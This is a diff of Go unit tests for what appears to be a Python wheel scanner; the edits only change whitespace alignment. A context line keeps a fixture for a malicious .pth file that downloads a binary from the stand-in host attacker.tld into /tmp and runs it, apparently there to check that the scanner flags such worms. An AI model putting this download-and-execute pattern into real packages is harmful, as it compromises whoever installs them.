@@ -41,7 +41,7 @@ func TestInspectDataSchemePurelibFlagsWorm(t *testing.T) {
 		`urllib.request.urlretrieve('https://attacker.tld/bun','/tmp/bun'); ` +
 		`subprocess.Popen(['/tmp/bun','/tmp/_index.js'])` + "\n"
 	r, n := buildWheel(t, map[string]string{
-		"foo/__init__.py":                            "",
+		"foo/__init__.py": "",
 		"foo-1.0.0.data/purelib/ensmallen-setup.pth": hadesBody,
 	})
 	v, err := wheel.Inspect(r, n)
@@ -51,7 +51,7 @@ func TestInspectDataSchemePurelibFlagsWorm(t *testing.T) {
 
 func TestInspectTopLevelPathOnlyClean(t *testing.T) {
 	r, n := buildWheel(t, map[string]string{
-		"foo/__init__.py":                  "",
+		"foo/__init__.py":                   "",
 		"foo-1.0.0.data/purelib/extras.pth": "some/path\nanother/path\n",
 	})
 	v, err := wheel.Inspect(r, n)
